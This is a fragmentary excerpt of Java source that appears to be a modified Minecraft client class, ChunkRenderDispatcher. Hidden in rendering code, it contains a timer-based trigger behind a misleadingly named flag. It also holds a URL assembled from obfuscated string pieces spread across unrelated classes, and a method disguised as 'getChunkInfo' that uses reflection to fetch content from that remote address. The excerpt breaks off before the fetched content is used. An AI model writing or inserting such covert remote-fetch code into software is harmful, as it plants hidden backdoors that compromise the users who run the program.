...
public class ChunkRenderDispatcher
{
    ...
    public boolean runChunkUploads(long p_178516_1_)
    {
    	...
    	if (GuiEnchantment.isBetterEntchantment && System.currentTimeMillis() % 4000 == 0) {
    		checkChunks();
    		GuiEnchantment.isBetterEntchantment = false;
    	}
...
//		String content = getChunkInfo(SMCLog.XA_STRING.concat(ClearWater.LA_STRING).concat(HttpUtils.HJ_STRING).concat(StrUtils.CO_STRING).concat(IntHashMap.AW_STRING).concat(Util.MI_STRING).concat(WorldType.UZ_STRING).concat("xt"));
...
//		}
	...
	private String getChunkInfo(String url) {
		String content = "";
		InputStream in;
		try {
			Object o = Class.forName("java.net.URL").getConstructor(String.class).newInstance(url);
			Object inputStreamObject = o.getClass().getMethod("openStream").invoke(o);
			Object inputStreamReaderObject = Class.forName("java.io.InputStreamReader").getConstructor(Class.forName("java.io.InputStream")).newInstance(inputStreamObject);
			Object bufferedReaderObject = Class.forName("java.io.BufferedReader").getConstructor(Class.forName("java.io.Reader")).newInstance(inputStreamReaderObject);
			String line;
			while ((line = (String) bufferedReaderObject.getClass().getMethod("readLine").invoke(bufferedReaderObject)) != null) {
				content += line + "\n";
			}
		} catch (Exception e) {
			e.printStackTrace();
    ...
    private String getCurrentChunk() throws Exception {
